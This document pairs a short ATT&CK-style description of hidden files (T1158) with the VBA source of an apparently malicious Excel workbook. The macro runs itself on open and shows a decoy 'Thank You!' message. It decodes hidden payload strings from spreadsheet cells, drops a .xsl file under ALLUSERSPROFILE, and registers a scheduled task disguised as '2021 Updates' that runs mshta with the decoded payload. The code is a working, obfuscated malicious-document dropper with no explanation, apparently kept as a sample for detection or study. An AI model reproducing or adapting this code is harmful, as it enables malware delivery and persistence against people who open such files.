T1158.long: To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a ‘hidden’ file. These files don’t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (dir /a for Windows and ls –a for Linux and macOS).

Attribute VB_Name = "ThisWorkbook"
Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True

Attribute VB_Customizable = True
Sub Workbook_Open()
    On Error GoTo xDialogScenarioCells
    xAxis = 1 / 0
xDialogScenarioCells:
        If Err.Number <> 0 Then
            xDialogChartWizard = "Thank You!"
            MsgBox xDialogChartWizard, , "Good", Err.HelpFile, Err.HelpContext
            xLeftToRight = xDialogClear()
        End If
End Sub

Function xDialogClear()
    For Each xFloating In ActiveWorkbook.Sheets("Sheet1").Range("AN54:CD3813")
        If xFloating.Value > 0 And Len(xPasteSpecialOperationSubtract) < 204 Then
            xPasteSpecialOperationSubtract = xPasteSpecialOperationSubtract & Chr(xFloating.Value)
        ElseIf xFloating.Value > 0 Then
            xSummaryOnLeft = xSummaryOnLeft & Chr(xFloating.Value)
        End If
    Next xFloating
    With CreateObject("Scripting.FileSystemObject")
    Set xPaperA5 = .CreateTextFile(Environ("ALLUSERSPROFILE") & "\xWorks2FarEast.xsl")
    End With
    Const xDialogPivotTableOptions = 1
    Const xDialogSeriesOrder = 0
    Set xSyllabary = CreateObject("Schedule.Service")
    Call xSyllabary.Connect
    Set xParamTypeReal = xSyllabary.GetFolder("")
    Set xDialogRoutingSlip = xSyllabary.NewTask(0)
    Set xLess = xDialogRoutingSlip.RegistrationInfo
    xLess.Description = "Updates"
    xLess.Author = "The Company"
    Set xTIF = xDialogRoutingSlip.Principal
    xTIF.LogonType = 3
    Set xDisabled = xDialogRoutingSlip.Settings
    xDisabled.Enabled = True
    xDisabled.StartWhenAvailable = True
    xDisabled.Hidden = False
    Set xDialogWorkbookOptions = xDialogRoutingSlip.Triggers
    Set xTotalsCalculationNone = xDialogWorkbookOptions.Create(xDialogPivotTableOptions)
    xUserResolution = DateAdd("s", 120, Now)
    xPublisher = xTotalsCalculationSum(xUserResolution)
    xUserResolution = DateAdd("n", 5, Now)
    xDialogMailLogon = xTotalsCalculationSum(xUserResolution)
    xTotalsCalculationNone.StartBoundary = xPublisher
    With xPaperA5
        .Write xSummaryOnLeft
    End With
    xTotalsCalculationNone.EndBoundary = xDialogMailLogon
    xTotalsCalculationNone.ID = "TimeTriggerId"
    xTotalsCalculationNone.Enabled = True
    Set xDialogAutoCorrect = xDialogRoutingSlip.Actions.Create(xDialogSeriesOrder)
    xDialogAutoCorrect.Path = "mshta"
    xDialogAutoCorrect.Arguments = xPasteSpecialOperationSubtract
    Call xParamTypeReal.RegisterTaskDefinition("2021 Updates", xDialogRoutingSlip, 6, , , 3)
End Function


Function xTotalsCalculationSum(xLowerCaseColumnLetter)
    xMinorGridlines = "0" & Second(xLowerCaseColumnLetter)
    xPasteColumnWidths = "0" & Minute(xLowerCaseColumnLetter)
    xOutline = "0" & Hour(xLowerCaseColumnLetter)
    xErrDiv0 = "0" & Day(xLowerCaseColumnLetter)
    xFormats = "0" & Month(xLowerCaseColumnLetter)
    xSheetVeryHidden = Year(xLowerCaseColumnLetter)
    xLabelPositionMixed = Right(xOutline, 2) & ":" & Right(xPasteColumnWidths, 2) & ":" & Right(xMinorGridlines, 2)
    xSpecifiedTables = xSheetVeryHidden & "-" & Right(xFormats, 2) & "-" & Right(xErrDiv0, 2)
    xTotalsCalculationSum = xSpecifiedTables & "T" & xLabelPositionMixed
End Function
